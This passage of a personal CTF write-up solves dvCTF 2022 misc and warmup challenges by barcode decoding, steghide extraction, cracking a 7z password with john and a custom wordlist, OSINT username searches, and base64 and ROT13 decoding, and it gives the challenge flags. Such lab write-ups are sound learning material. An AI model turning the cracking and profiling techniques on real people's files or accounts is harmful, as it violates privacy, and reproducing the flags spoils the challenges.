  <img src="/images/writeups/dvCTF2022/Misc/1_0.png" width="70%"/>
</p>

So it seems like they are very common on Australia Post letters and packages, so with this query on [Google](https://www.google.com/search?client=firefox-b-e&q=auspost+bar+decoder) I found that page "Bob" did as stated on the challenge description with this query _auspost bar decoder_:

[Bob Decoder](http://bobcodes.weebly.com/auspost.html)

Now grab some patience and input the letters corresponding with the bars in the image:

```
ASDFFDDADDAADAADFAFAFFDAFSFDAFASAFAAASADSAFDSDDDDDDDSSSDFFSDDADFAAS
```

<p align="center">
  <img src="/images/writeups/dvCTF2022/Misc/1_2.png" width="80%"/>
</p>

We got on the website a code:

Valid barcode
Format Control Code:  62 - Customer Barcode 3
Sorting Code: 78475110
Customer Information Field: V3K4N64r00

So at this point, didn't know what to do with that. I tried to look up for that number 78475110 on Australia (since it seems like each street has a number) but didn't work.
Then I remembered that this challenge had the Stego tag, my good old friend -.-"

When for some recon on steghide, first tried with the password, and saw nothing. Then I went for it with no password and it showed a file within:

```
steghide info map.jpg
"map.jpg":
  format: jpeg
  capacity: 76.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secretpwd.7z":
    size: 758.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

I extracted the file and create a wordlist with some combinations for cracking the 7z password:

```sh
kali@kali:~/Desktop/CTFs/dvCTF2022/Misc$ steghide extract -sf map.jpg              
Enter passphrase: 
wrote extracted data to "secretpwd.7z".

kali@kali:~/Desktop/CTFs/dvCTF2022/Misc$ perl /usr/share/john/7z2john.pl secretpwd.7z > 7z.txt 
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
                                                                                                                                                                                                    
kali@kali:~/Desktop/CTFs/dvCTF2022/Misc$ john --wordlist=passwords.txt 7z.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 8 for all loaded hashes
Cost 3 (compression type) is 1 for all loaded hashes
Cost 4 (data length) is 664 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
    6278475110V3K4N64r00 (secretpwd.7z)     
1g 0:00:00:00 DONE (2022-03-13 08:57) 1.369g/s 21.91p/s 21.91c/s 21.91C/s V3K4N64r00..V3K4N64r00
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

In case you are curious about the wordlist, I used the keys obtained from the barcode:

```
V3K4N64r00
Bob
bob
BOB
78475110V3K4N64r00
6278475110V3K4N64r00
78475110
6278475110
v3k4n64r00
V3K4N64R00
VEKANGAROO
vekangaroo
62-78475110-V3K4N64r00
```

Then I extracted the 7z file and saw this directories within:

```
$ ls
1013:0000000000000000000000000000000000000000  1441:0011011000111001110000000111111001111000  1657:0011100001111000011111100111110111101100  1789:0011111111111111111111111111111111111100
1020:0011100000000110011111000111001000011100  1441:0011011111111001111100100111000110011100  1660:0011011000111001110000000111111001110000  1838:0011011001001001101100100110110110010000
1044:0011011000111110011111011000110000010000  1460:0011000111001001101100111110110000011100  1668:0011100001110001110000000000110001111100  1890:0011011110000110001100011000000001111100
1063:0011100001001111110010011001000111011100  1507:0011111111000000011111100111000000000000  1670:0000000000000000000000000000000000000000  1904:0011100001001111110011011001000110011100
1115:0011000000110000011111100001000001100000  1514:0011111110000110000000111111001000011100  1722:0011111110000110000000111111001000011100  1941:0011000001001000011100000110111000000000
1144:0011000111111001100011000001001001100000  1532:0011000111111000010011100110000110011000  1727:0011000001001000011100000110111000000000  1956:0011011110111000001111011000001000011100
1154:0011000111001001100100111100110000011100  1568:0011111111110000001100000000000111111100  1730:0011011000110110000000011001001111100000  1975:0011011100111100001111011000001000011100
1155:0011011111000111101101100011001110000000  1600:0011111111000000011111100111000000000000  1745:0011111111110000001100000000000111111100  
1189:0011111111111111111111111111111111111100  1617:0011011111000111101100100001001110000000  1746:0011000000110000111111100001000001100000
1209:0000000000000000000000000000000000000000  1648:0011011011001001001100100100010010111000  1757:0000000000000000000000000000000000000000
1221:0011011111111101111100100111000010011100  1657:0011011110110000000011000000110110010000  1789:0011000111111000010011100100000010010000
```

At this point it was too much guess for my brain and prefered to do other challs.


## The HackerMan
491
Easy OSINT Steganography

I found someone on social media, teasing a CTF he made but I couldn't find out more. I think his pseudonym was "BornHackerMan".

So running sherlock tool it showed that he has [Twitter account](https://twitter.com/i/status/1466061497021480962). 

There we can find some tweets, one video and a gif.

On the video we can see that it has captions, so I looked at them and said:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Misc/3_0.png" width="55%"/>
</p>

<p align="center">
  <img src="/images/writeups/dvCTF2022/Misc/3_1.png" width="55%"/>
</p>

<p align="center">
  <img src="/images/writeups/dvCTF2022/Misc/3_2.png" width="55%"/>
</p>

_I finish my first CTF *hurray*_

_Find it at "hacker/[0-9]+/"_

_Signed: "The Hackerman"_

Then, other tweet says:

```
Docker is such an amazing tool to build CTFs.
GitHub is also really usefull.
```

So probably he posted his CTF challenge in docker. Looking at that regex in the _Find it at "hacker/[0-9]+/"_ and the [DTMF](https://onlinetonegenerator.com/dtmf.html) dialing sounds at the start of the video made me feel close to the solution. So I grabbed the video from Twitter and used SonyVegas for isolating the video so I could input it on other tool rather than decoding the DTMF by ear... 

Use this [website](http://www.dialabc.com/sound/detect/index.html) to decode the wav file and showed that the followind numbers were dialed:

```
439804
```

Following the regex on the video I tried many things, but didn't work:

```
hacker/439804/

https://hub.docker.com/r/hacker/439804/
```

I searched for other thehackerman, thehacker, hackerman... But no luck.

I missed that for just a slash... The solution was the following link and check the log files of the container. The regex was wrong, but I suppose that was my bad, try harder next time:

[https://hub.docker.com/r/hacker439804/myfirstctf](https://hub.docker.com/r/hacker439804/myfirstctf)

---

# Warmup

## FrenchFlag
10
Forensic
Can you find the data present in our flag ?

```
exiftool flag.png 
ExifTool Version Number         : 12.36
File Name                       : flag.png
File Modification Date/Time     : 2022:03:11 14:41:00-05:00
File Access Date/Time           : 2022:03:11 14:41:16-05:00
...
XMP Toolkit                     : Image::ExifTool 12.40
Creator                         : dvCTF{flagception}
Image Size                      : 1280x853
Megapixels                      : 1.1
```

``` dvCTF{flagception} ```

## EBG13
10
Crypto
We found this message : can you decipher it?

qiPGS{3apElcg1ba_1f_r4fl}

ROT 13

``` dvCTF{3ncRypt1on_1s_e4sy} ```

## QmFzZTY0
10
Crypto

```
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFjVkZ0UmxSTmJFcEpWbTEwYTFkSFNrZGpSVGxhVmpOU1IxcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMXBGV2xOVWJGcFlaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHdlR0l4U2tkWGJHUllZbFZhY2xWcVJtRlRSbGw1VFZSU1ZrMXJjRWxhU0hCSFZqSkZlVlZZWkZwbGEzQklXWHBHVDJSV1ZuUmhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpJMWExWXdNVVZTYTFwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkhhRlJXTUZwVFZqSkdSbFJzVG1sU2JrSmFWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RTUmxweFVWaG9hMVpzV2pGV01uaGhZVWRGZUdOR2JGaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXNW9WVlpHWTNoaU1rbDRWMWhvV0dKRk5WVlVWM1J6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZreFdrZFdWa3B6VkdzMVYwMVZiekZXYlhCS1RWZEZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpPVFZad2VGVXlkREJXTVZweVkwWndXR0V4Y0ROV2FrWkxWakpPU1dKR1pGZFNWWEJ2Vm10U1MxUXlUWGxVYTFwb1VqTkNWRmxZY0ZkWFZscFlZMFU1YVUxcmJEUldNV2h2V1ZaS1IxTnNaRlZXYkZwNlZHeGFZVmRGTlZaUFZtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1lVWndSbHBHVGxSU2EzQjVWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFYzUnJWVEZzVjFWc1dsaGlWVnBQVkZaYWQyVkdWWGxrUkVKWFRWWndlVmt3V25kWFIwVjRZMFJPVjJGcldreFdha3BQVTFkS1IxcEdaRk5XV0VKMlZtMTBVMU14VVhsVVdHeFZZVEZ3YjFWcVRrTldSbXh5Vm01a1YxWnNjREJhVldNMVZXc3hXRlZ1Y0ZkTlYyaDJWakJrUzFKck5WZFZiRlpYVFRKb1NWWkhlR0ZXTWxKSVZXdG9hMUl5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZteHdNMWxWV25kU2JIQkhWR3hTVTJFelFqVldSM2hoVkRKR1YxTnVVbEJXUlRWWVZGYzFiMWRHYkhGVGExcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVm10M1YyNWtXRkl3VmpSWk1GSlBWakpHY2xkcmVGZE5WbkJJV1RJeFMxSXhjRWhpUm1oVFZsaENTMVp0TVRCVk1VMTRWbGhvV0ZkSGFGaFpiWGhoVm14c2MxcEhPVmRTYkVwWlZHeGpOVll4V25OalJXaFlWa1UxZGxsV1ZYaGpiVXBGVld4a1RsWXlhREpXYWtKclV6RktjazVXWkZkaVJscFlWRlJHUzA1c1draGtSMFpYWWxaYVdWWlhkRzloTVVwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmhXYkZweVdYcEdWbVF3TVVsaFJrNW9Za2hDV1ZkV1pEQmtiVkY0VjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdqWlJhbEphWVd0YVlWcFZXbGRqTWtaR1QxWmthR1ZzV2xGV2ExcGhXVmRSZVZaclpGZFhSM2h5Vld0V1MxZEdVbGRYYm1Sc1ZtMTBNMVl5Tld0WFJrbDNWbXBTV2sxR1NsQldNakZHWlZaV2NscEhSbGROTW1oSlYxUkplRk14U1hsU2EyUm9VbXhLVkZac2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVjBWNVUydGthbEpYYUZoWmJGSkNUVlphV0dNemFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Umt0amF6VlhXa1phYVZKc2NGbFhWM2hoVW0xUmVGZHVSbE5pVlZwWVZGZDRTMU5XV2xoa1J6bG9UVlZ3TUZaWGN6VldNa1p5VjJ0NFZrMXVhSEpXYWtaaFpFWktkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFZUWxsYVZXaExZa1paZUZkcmJHRlNWMUYzVmxSS1JtVnNSbGxhUm1ocFVteHdiMWRXVWt0U01XUkhVMnhzWVZJelFsUldhazV2VjFaa1dHVkhPVkpOVmtwSVZsYzFTMWRIU2taalNFNVdZbFJHVkZwWGVITldiR1J6Vkcxb1UxWkZXalpXVkVreFlqRlplRmRxV2xOV1JVcG9WV3RXWVdOc1ZuRlRhM1JVVm14S01GbFZXazloUjFaelYycGFWMDFYVVhkWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0ZUhOT1ZuQldZVWQwV0ZJd2NFaFpNRnB2VjJzeFNHRkZlRmROYm1ob1ZqQmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFoc1UyRXlVbTlWYlhoTFZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JURTBZekpPYzJORmFGQldNMEpVV1d0b1EwNUdXbkpaTTJSUFZteHNORll5TlU5aGJFcFlZVVpzVjJFeFZYaGFSM2h6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbVJYVjJ0MGFrMVdTakZXUnpGdlZUSktSMk5HYkZkU2JFcE1XV3BHVDFZeFpISmhSM2hUVFVad2FGWnRNSGhWTVU1WFYyNVNhMUo2Ykc5VVZsWnpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYmtwWFlXdGFhRnBGVlRWV01WcHlUbFprYVdFd1dYcFdiWGhxWkRBeFYxUllhRmhoTW1oVldXdGtiMkl4Vm5GUmJVWlhZa1p3TUZwVmFHdFVhekZaVVd4c1lWWlhhRXhaYTFwaFZsWktjMXBHYUdoTldFSlJWMVphWVZNeVRuUlVhMVpZWWtkU2IxUlhjekJOUm1SWlkwVmtWMkpXV2xoV1J6VlhWa2RLUjFOdVFsZGlSbkF6VmpGYVlWSXhiRFpTYld4T1ZqRktTVll5ZEdGaE1XUklVMnRhYWxORk5WZFpiRkpIVmtad1dHVklUbGRpUjFKNlZrY3hiMVl5UlhwUldHaFhWbTFOZUZscVJscGxSbVJaWTBkb1ZGSllRbGxXYlhSWFdWZFdjMWR1UmxOaVIxSnhWRlprVTJWc2JGWmFTRTVYVFZad01WVlhjR0ZXTURGWVZWaGtXRlp0VWs5YVJFRjRVMWRHUjJGR2FGTk5NbWhSVm0weE5HRXhWWGhYV0doV1lrZG9jbFV3WkZOV1JsSlhWMnQwYkdKSGVGZFpWV1F3VjBaSmQyTkZhRnBOUm5CMlZqSnplRk5IUmtabFJtUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVGxkaGVsWllWakZvYjJGc1NsaGhSemxXWVd0d2RsWkVSbFprTVZweVpFVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm0weGIyVnNXblJOVlZwc1ZteGFlbFl5ZUhkaFZtUkhVMWh3V0Zac1dtaFdha3BUVTBaYWNsZHRkRk5OTUVwVlYxZDBiMUV3TlVkWGJrcGFUVEpTVUZadE1WTlRSbGw1VGxVNWFHSkZjREJhVldSSFZsWmFWMk5HWkZWV2JIQjZWbXBHWVZkWFJrZGhSazVwVW01Qk1WWXhXbGRaVjBWNFZXNVNVMkpyTlZsWmExcGhWMFpzVlZOc1NrNVNiRmt5VlcxME1HRnJNVmxSYTNCWFlsaG9WRmxXV2t0ak1rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlUxV0ZZeU5WTmhNVW8yWWtjNVZWWnNXbnBVYkZwelZtMUdSbFJzWkdsV1dFSktWMVpXVjFReGJGZFRhMXBZWW10d1dGbFhkR0ZoUm5CR1ZsUldWMDFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaWldsVmFhMVl3TVhGV2JrcFhWa1Z3VEZVeFdrZGpiVVpIV2taT1RrMXRhRlpXYlRGM1V6Rk5lVlJ1VGxWaWEzQnhWVzB4YjJOR1ZuUmxTR1JzVm0xU1dsa3dWbXRXTWtwWFYyeG9WMUo2VmxCWlZscExaRlpHY2s5V1ZsZGxhMW95Vm1wR1lXRXhXWGhXYmtwaFVqTlNUMWxVUm5kVFZscHhVMnBTVjAxV1ZqVlZNblJyWVd4T1JrNVdaRnBpUmtwSVZtdGFVMVl4WkhOWGJYaFhUVVJSZVZaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGT1pVWnNjVkpzY0d4U2JWSmFXVEJrYjFaR1NsbFJiR1JZVm14S1RGWlVSazlTTVZwMVVteE9hVlpXY0ZwV2JUQXhVVEZPVjJKR1dsaGhlbXhZVkZaYWQxTkdXWGxsUjBaWFRXdHdTVlpIY0ZOV1YwVjVWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTW5oclZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SVVtdGFiRkp0VWs5WmJURnZZakZhY1ZGdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1WWnlXa2RvVGxaVVJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXeG9UbVZHV1hkWGJIQnJUVlp3ZVZwRlZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhibEpPVmxad2MxWnRlR0ZsYkZwMFpVaGthRlp0VWtoVk1XaDNWMFpaZWxGcmFGZGhhM0JRVm1wR1UyUldWbk5SYkdScFZtdHdWbFl4WkRSaU1rbDNUbFprV0dKc1NrOVZhMVpoWWpGU1YxZHVUazlTYkd3MVZHeFZOV0ZIU2taalJXUldUV3BHZGxacVNrdFRSbFp5VDFaV1YySklRbTlXYWtKclZHMVdkRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1HUXlTa2RUYms1VVlXdGFXRlZ1Y0VkVFJscFZVMnQwVTAxck5VaFphMXB2VmpBd2VGTnRPVmhoTVVwRFZGWmtUbVZHY0VsVGJVWlRZa2hDZGxaR1pEUlRNV1JIVjJ0a1lWTklRbk5WYkZKWFYwWmFkRTVXVG1oTlZXd3pWako0YTFadFNsbGhTSEJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkc2FGUmlSM2h2VlRCV2QxZEdiSEpYYm1SVVVtNUNSMVl5ZERCaE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVGJHeG9VakJhVkZacVNtOVdiR1JZWkVkMGFVMXJiRFJXYlRWVFZHeGFObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV0ZsclVsTlhSMFY1WVVab1YyRXlVa3hXTUdSWFUxWlNjMk5HWkZOV2JUazJWbTF3UjFsWFJYaFhXR2hxVWxaYVUxbHNhRk5qUmxwMFpFWndUbEpzY0hoVk1uQlRWakF4VjFacVZsWmlSMmgyV1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGa01XUklWbXRzVldKSFVuQlZha1pMVG14YWNsa3phR2xOVmxZMFZqSjBZVmRIUm5OalJtaFhZVEZhZVZwVlduTldWa3B6WTBkNFUySldTbUZYVkVKaFdWZEdWMWRZYkdoU2JXaFpXV3RrVW1ReFpGZFhiazVYVFdzMVNGWXllRzloVmtsNFUyNW9WMUp0VVhkWFZscEtaVVpXV1dGR2FHbFhSa3AzVmxkd1EyUXhaSE5pUmxwV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFYwWnNkR1ZGZEdwaVJsWXpWMnRhVDJGck1WaGxTR3hYVFc1b2NsWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTRlp0TlZkWFIwcElWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVlRa3BYYTFwVFZHeGFWVkpVUWxkV1JWcDJXWHBHVm1WV1NsbGlSMmhUWlcxNFdGZFhkR0ZUTVdSSFYxaGtXR0pyTlhKVmFrWkxVakZ3UmxaVVJtaFdhM0F4VlZab2ExWXhTbk5qUmxKV1ZrVmFhRmt5YzNoV01XUnlUbFprVTJFelFscFdiVEF4WkRGWmVGZHJaRmhpYTFwVldWUkdkMk14V25SbFIwWk9VbTE0VjFZeU1VZFdWMHBHWTBSR1ZsWjZRVEZXYWtwTFZsWktWVkZzY0d4aE0wSlJWMWh3UjJReFRsZFdiazVWWWxkNFdWVnNWbmRXYkZsNFdrUkNhVTFWVmpOVWJGWnJWMGRLY21OSFJsVldSWEJVVmxWYVlXUkhWa2xVYXpsVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKdGVHRldiRnAzWkd4YWMxZHRSazlpUm5BeFZqSjRkMVJ0U25SaFJGcFhZbGhvYUZWcVJtdFhSa3B5V2tkb1UyRjZWbmRXVnpCM1RsVTFSMWRZYUZaaE1EVmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0hwV01HUlRVbTFTU0dOSGJGTmlSM1ExVm14amVFMUZNVWhTYmxKVFlXeHdXRmxyWkc5WFZteFZVbTVrYUZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtUm9ZVE5CTWxkc1ZtRlRiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFNSVFZXVm14YWQyRkdXWGRXVkVaWFlrWktlbGRyVlRGaFJUQjNVMnQwVjAxV2NGaFdha1pXWlVaa2MyRkdVbWhOYkVwNFZsZHdTMkl4V1hoVmJGcGhVbXMxV1ZWdGVGZE5NVmw1WkVSQ2FHRjZSbGxXVnpWelZsZEtSMk5JU2xwV2JIQnlWVEJhVTJOV1ZuTmFSMnhZVWpKb05WWnJaREJoTVU1MFZteGtWbUpIZUc5VmJURnZZMFpzV1dOR1pGaGlSMUpZVmxkMGEyRXdNVmRqUm1oYVlUSm9URmRXV2t0T2JVcEhZa1phYVZaRlZYZFdha1poWTIxV2RGUnJXbUZTTW1oUFdWUk9RMU5zWkhOV2JVWm9UVlpzTTFSV2FFZFZNa1Y1WVVkR1YyRnJOWFpaVlZweVpWVXhWazlXVWxkTlJGWkpWMVpXYTJJeFVuTmFSVnBVVjBkNFdGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdVpGZFdla0kwVmxSR2ExSXlTa2xVYkdob1RWaENlVlpHV21Gak1EVkhWMWhzVGxaWFVsbFZha0ozVjBaWmVXUkhPVmROVlc4eVZtMTBORll3TVVoVmEzaFdZbGhOZUZacVNrZFNNV1IwWWtaT2FXRXdjRnBXYlhSclRrWktjazlXWkZKaVJYQlNWbXRTUWs5UlBUMD0=
```

20 base64 decode iterations

``` dvCTF{Base64_Is_The_Best} ```

That was all that could handle myself for the amount of time. Thanks for reading!
